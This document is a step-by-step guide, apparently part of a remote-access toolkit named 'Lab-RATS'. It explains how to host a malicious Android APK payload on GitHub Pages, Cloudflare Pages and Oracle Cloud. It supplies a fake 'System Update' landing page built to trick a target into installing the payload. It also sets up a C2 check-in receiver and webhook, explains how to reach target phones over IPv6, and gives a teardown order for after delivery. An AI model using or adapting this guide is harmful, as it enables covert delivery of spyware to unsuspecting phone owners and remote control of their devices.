# 14 ⏤ Free IPv6 Hosting & Delivery Guide

> This guide provides step-by-step instructions for hosting compiled APK download links and check-in receivers using free tier cloud platforms, static CDNs, and IPv6 tunnel brokers.

---

## 🎯 Job Selector

Choose the hosting configuration that fits your operational requirements:

| Objective | Recommended Provider | Section |
| :--- | :--- | :--- |
| **Serve the APK once to a single target** | **GitHub Pages** | **Section 1** |
| **Serve the APK with HTTPS & global CDN** | **Cloudflare Pages** | **Section 2** |
| **Serve APK + self-host check-in receiver logs** | **Oracle Cloud Always Free** | **Section 3** |
| **Serve from a home machine behind dynamic IPv6** | **dynv6 + Home Server** | **Section 4** |
| **Connect to target IPv6 when workstation lacks native v6** | **WireGuard / Route64 Tunnel** | **Section 5** |

---

## 1. Hosting APK Downloads on GitHub Pages

GitHub Pages provides static HTTPS file hosting backed by native IPv6 (`*.github.io`).

### 1.1 Create a Public Repository
1. Log into GitHub and create a new public repository (e.g. `app-delivery`).

### 1.2 Upload the Compiled APK
1. Upload your compiled payload (`signed_v1.apk`) to the repository root.

### 1.3 Add `.nojekyll`
1. Create an empty file named `.nojekyll` in the repository root. (This prevents GitHub from running Jekyll build filters on raw APK binaries).

### 1.4 Enable GitHub Pages
1. Go to **Settings** $\rightarrow$ **Pages**.
2. Set **Source** to **Deploy from a branch**, select `main` branch `/ (root)`, and click **Save**.
3. Your live download URL:
   `https://<your-username>.github.io/app-delivery/signed_v1.apk`

### 1.5 HTML Landing Page (`index.html`)
To serve the file cleanly without raw browser download warnings, create an `index.html`:
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>System Update</title>
</head>
<body style="font-family: system-ui, sans-serif; padding: 2rem; text-align: center;">
  <h1>System Update Available</h1>
  <p>Tap below to download and install the security update patch.</p>
  <a href="signed_v1.apk" download
     style="display: inline-block; padding: 1rem 2rem; background: #007bff; color: #fff; border-radius: 8px; text-decoration: none; font-weight: bold;">Download Update</a>
</body>
</html>
```

### 1.6 CLI Deployment Variant
Quickly publish your build directory using Git CLI:
```bash
cd /tmp && mkdir labrats-dl && cd labrats-dl
cp ~/Lab-RATS/apk-builder/output/signed_v1.apk .
touch .nojekyll
git init -b main
git remote add origin git@github.com:<your-username>/labrats-dl.git
git add . && git commit -m "publish payload"
git push -u origin main
```

### 1.7 Free Tier Limits
- **Site Size:** 1 GB (payload APKs are ~10–15 MB).
- **Bandwidth:** 100 GB / month.
- **Build Timeout:** 10 minutes.

### 1.8 Repository Cleanup
After target installation, delete the repository via **Settings** $\rightarrow$ **Delete this repository** to clean up deployment artifacts.

---

## 2. Hosting APK Downloads on Cloudflare Pages

Cloudflare Pages delivers high-speed global distribution over HTTPS with native dual-stack (IPv4/IPv6) support.

### Step 1: Deploy with Wrangler CLI
```bash
npx wrangler pages deploy apk-builder/output --project-name labrats-delivery
```

### Step 2: Ensure Proper MIME Type with `_headers`
Add a file named `_headers` to your deployment folder before publishing:
```http
/signed_v1.apk
  Content-Type: application/vnd.android.package-archive
  Content-Disposition: attachment
```

---

## 3. Oracle Cloud Always Free VPS (APK Server + Check-In Receiver)

Oracle Cloud offers an ARM virtual machine (`VM.Standard.A1.Flex`) with 2 OCPU / 12 GB RAM on its Always Free tier.

### 3.1 Provision Instance
1. Create an Ubuntu 22.04 ARM instance (`VM.Standard.A1.Flex`) in Oracle Cloud Console.

### 3.2 Enable IPv6 on VCN & VNIC
1. Navigate to **Virtual Cloud Networks (VCN)** $\rightarrow$ **CIDR Blocks** $\rightarrow$ **Add IPv6 CIDR Block** (`/56`).
2. Go to **Subnets** $\rightarrow$ **Add IPv6 CIDR Block** (`/64`).
3. Attach an IPv6 address to your VM's Virtual Network Interface (VNIC).

### 3.3 Configure Firewall & Security Groups
Open TCP ingress ports `8080` (APK Server) and `9000` (Check-in Receiver) in Oracle VCN Ingress Rules (`::/0`) and host `ip6tables`:

```bash
sudo ip6tables -A INPUT -p tcp --dport 8080 -j ACCEPT
sudo ip6tables -A INPUT -p tcp --dport 9000 -j ACCEPT
sudo netfilter-persistent save
```

### 3.4 Automated Systemd Background Services

#### 1. APK Server Service (`/etc/systemd/system/labrats-apk.service`):
```ini
[Unit]
Description=Lab-RATS APK Delivery Server
After=network-online.target

[Service]
WorkingDirectory=/opt/labrats/serve
ExecStart=/usr/bin/python3 /opt/labrats/serve_apk.py
Restart=always

[Install]
WantedBy=multi-user.target
```

#### 2. Receiver Service (`/etc/systemd/system/labrats-rx.service`):
```ini
[Unit]
Description=Lab-RATS Check-in Receiver
After=network-online.target

[Service]
WorkingDirectory=/opt/labrats
ExecStart=/usr/bin/python3 /opt/labrats/checkin_rx.py
Restart=always

[Install]
WantedBy=multi-user.target
```

Enable and start services:
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now labrats-apk labrats-rx
journalctl -u labrats-rx -f    # Monitor check-ins in real-time
```

### 3.5 C2 Webhook URL Configuration
```http
C2_WEBHOOK_URL=http://[<instance-ipv6>]:9000/checkin
```

---

## 4. Dynamic DNS with dynv6 (Home Server Hosting)

If serving from a home server behind dynamic IPv6 prefixes:

1. Create a free hostname at [dynv6.com](https://dynv6.com).
2. Configure dynamic DNS updates to point the `AAAA` record to your server's public IPv6 address.
3. Because Android privacy extensions rotate target interface IDs daily, pointing domain `AAAA` records to your home server prefix maintains stable connectivity.

---

## 5. Workstation IPv6 Tunnel Setup (When Workstation Lacks Native v6)

If your operator workstation is on an IPv4-only network or behind strict CGNAT, use a WireGuard IPv6 tunnel broker to obtain a public IPv6 address:

- **Route64 (Recommended):** Provides a `/56` IPv6 subnet over WireGuard that operates cleanly through CGNAT.
- **TunnelBroker (Hurricane Electric):** Provides 6in4 / proto 41 tunnels (requires a publicly pingable IPv4 address).

```bash
# Start WireGuard tunnel to Route64
sudo wg-quick up wg0
curl -6 -s https://ifconfig.co    # Verify public IPv6 routing
```

---

## 🧪 6. Verification Commands

Test payload delivery endpoints and DNS records:

```bash
# Verify GitHub Pages headers and content type
curl -sI "https://<user>.github.io/app-delivery/signed_v1.apk" | head -5

# Check IPv6 AAAA DNS resolution
dig +short AAAA <user>.github.io | head -3

# Test Oracle Cloud IPv6 server reachability
curl -i --max-time 10 "http://[<instance-ipv6>]:8080/signed_v1.apk"
```

---

## 📊 7. Free-Tier Status & Limits Comparison

| Provider | Status | Native IPv6? | Best Used For | Limits / Notes |
| :--- | :--- | :--- | :--- | :--- |
| **GitHub Pages** | Active | **Yes** | Static APK Delivery | 100 GB/mo bandwidth limit |
| **Cloudflare Pages** | Active | **Yes** | Static APK Delivery | Unlimited requests, 500 builds/mo |
| **Oracle Always Free** | Active | **Yes** | APK Host + Receiver | Reclaims idle VMs if unmonitored |
| **Render.com** | Active | **Yes** | C2 Node.js Relay | Free tier sleeps after 15 min idle |
| **Fly.io** | Changed | **Yes** | Cloud Containers | Free tier replaced with trial plans |
| **Koyeb** | Changed | **Yes** | Micro Services | Requires card verification |

---

## 🏗️ 8. Minimum Viable Architecture & Teardown Order

### Minimum Viable Setup:
- **Payload Delivery:** GitHub Pages static link (`https://user.github.io/.../signed_v1.apk`)
- **Check-in Receiver:** Google Sheets Apps Script Web App
- **Control Path:** Direct IPv6 connection to device port `9191`

### Post-Engagement Teardown Order:
1. Trigger **Suicide Command** from C2 dashboard (wipes payload and uninstalls).
2. Delete delivery repository on **GitHub Pages**.
3. Delete **Google Sheets** deployment log.
4. Revoke or stop **Oracle Cloud / VPS** instances.
